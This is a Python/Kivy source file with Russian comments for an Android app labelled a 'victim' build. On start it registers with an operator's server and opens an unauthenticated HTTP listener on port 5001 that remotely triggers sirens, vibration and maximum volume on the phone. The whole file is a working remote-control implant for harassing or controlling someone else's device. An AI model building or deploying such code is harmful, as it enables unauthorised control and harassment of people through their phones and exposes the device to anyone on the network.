# main.py — Kivy APK, жертва
# Сборка: buildozer android debug
# Требует: kivy, requests

from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.core.audio import SoundLoader
from kivy.utils import platform
import threading
import time
import os
import requests

SERVER_IP = "192.168.1.100"  # замени на IP сервера
SERVER_PORT = 5000
VICTIM_ID = "victim-phone"

# HTTP-сервер на жертве — встроенный
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/exec":
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode()
            try:
                data = json.loads(body)
                cmd = data.get('cmd', '')
            except:
                cmd = ''
            print(f"[L] got: {cmd}")
            threading.Thread(target=self.run_cmd, args=(cmd,), daemon=True).start()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

    def run_cmd(self, cmd):
        if cmd == "play":
            self.play_sound("beep.wav")
        elif cmd == "siren":
            for _ in range(20):
                self.play_sound("siren.wav")
                time.sleep(0.5)
        elif cmd == "stop":
            self.stop_sound()
        elif cmd == "vibrate":
            self.vibrate()
        elif cmd == "volume_up":
            self.set_volume(1.0)
        elif cmd == "volume_down":
            self.set_volume(0.2)

    def play_sound(self, name):
        path = os.path.join(os.path.dirname(__file__), name)
        if not os.path.exists(path):
            print(f"[L] no file: {path}")
            return
        snd = SoundLoader.load(path)
        if snd:
            snd.volume = 1.0
            snd.play()

    def stop_sound(self):
        # Kivy SoundLoader не имеет глобального стопа — только на объект.
        pass

    def vibrate(self):
        if platform == 'android':
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            Vibrator = autoclass('android.os.Vibrator')
            activity = PythonActivity.mActivity
            vibrator = activity.getSystemService(Context.VIBRATOR_SERVICE)
            vibrator.vibrate(5000)

    def set_volume(self, v):
        # Громкость через AudioManager
        if platform == 'android':
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            AudioManager = autoclass('android.media.AudioManager')
            activity = PythonActivity.mActivity
            am = activity.getSystemService(Context.AUDIO_SERVICE)
            max_vol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            am.setStreamVolume(AudioManager.STREAM_MUSIC, int(max_vol * v), 0)

    def log_message(self, *args):
        pass

def start_server():
    server = HTTPServer(('0.0.0.0', 5001), Handler)
    print("[L] server on 0.0.0.0:5001")
    server.serve_forever()

def register():
    try:
        requests.post(f"http://{SERVER_IP}:{SERVER_PORT}/register",
                     json={'id': VICTIM_ID, 'name': VICTIM_ID}, timeout=5)
        print(f"[L] registered on {SERVER_IP}")
    except Exception as e:
        print(f"[L] register fail: {e}")

class VictimApp(App):
    def build(self):
        threading.Thread(target=start_server, daemon=True).start()
        threading.Thread(target=register, daemon=True).start()
        return Label(text="Running...")

if __name__ == '__main__':
    VictimApp().run()